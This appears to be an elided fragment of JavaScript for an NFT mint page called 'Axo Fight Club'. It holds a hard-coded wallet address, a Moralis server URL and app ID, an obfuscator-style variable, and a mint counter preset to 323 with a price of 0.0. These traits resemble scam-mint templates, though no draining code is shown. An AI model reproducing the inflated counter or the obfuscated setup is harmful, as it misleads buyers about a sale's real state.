const ADDRESS = '0xEABF52187A9CA024d1ACF21FFdf715647240a43E';
...
const MAX = 3
const namess = "Axo Fight Club";
const discord = 'https://discord.gg/axofightclub';
const twitter = 'https://twitter.com/axofightclub';
const startCounter = 323;
const endCounter = 750;
let price = 0.0;
...
var progressBar = (mintNumber / endCounter * 100).toFixed(1);
if (progressBar >= 100) {
    progressBar = 100;
}
...
var serverUrl = "https://ynyz5o0ww93f.usemoralis.com:2053/server",
    appId = "8RFBzbLyffmJYbVB0X9RiOTgUnVrVNv5SFVZfnp2",
    _0x1829e9 = {};
...
document.querySelector(".plus").addEventListener("click", () => {
    if (countAmount < MAX) {
        countAmount++;
        totalPriceAmount = (countAmount * price).toFixed(1);
